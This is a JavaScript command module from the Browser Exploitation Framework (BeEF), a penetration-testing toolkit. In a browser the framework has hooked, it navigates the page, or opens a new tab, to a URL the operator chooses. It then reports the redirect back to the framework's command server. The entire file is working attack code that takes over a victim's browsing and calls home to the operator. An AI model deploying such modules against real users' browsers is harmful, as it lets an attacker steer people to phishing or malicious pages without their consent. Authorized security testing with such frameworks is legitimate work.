//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var redirectUrl = "<%= @redirect_url %>";
	var openNewTab = "<%= @open_new_tab %>" === "true";

	if (openNewTab) {
		window.open(redirectUrl, '_blank', 'noopener,noreferrer');
	} else {
		window.location = redirectUrl;
	}

	beef.net.send('<%= @command_url %>', <%= @command_id %>,
		'result=' + encodeURIComponent((openNewTab ? 'Opened new tab: ' : 'Redirected: ') + redirectUrl));

});
